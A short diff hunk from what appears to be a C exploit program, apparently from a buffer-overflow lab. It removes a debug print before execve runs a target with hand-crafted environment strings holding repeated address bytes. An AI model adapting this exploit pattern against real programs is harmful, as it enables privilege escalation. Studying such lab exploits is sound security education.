@@ -41,8 +41,6 @@ int main(void)
   env[5] = "\xf0\xfd\x21\x30\xf0\xfd\x21\x30\xf0\xfd\x21\x30";
   env[6] = NULL;
 
-  print_argv(args, env);
-
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
 
